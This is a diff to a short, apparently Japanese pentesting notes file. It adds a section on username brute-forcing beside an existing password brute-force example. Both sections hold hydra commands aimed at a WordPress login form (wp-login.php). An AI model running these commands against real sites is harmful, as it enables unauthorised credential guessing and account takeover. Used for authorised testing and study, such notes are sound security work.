@@ -31,3 +31,9 @@
 ``` shell
     sudo hydra XXXXXX -s 80 -l admin -P <passwordlist> http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:incorrect"
 ```
+
+## ユーザー名のブルートフォース
+
+``` shell
+    hydra XXXXXX -L <namelist.txt> -p test http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=<error_message>"
+```
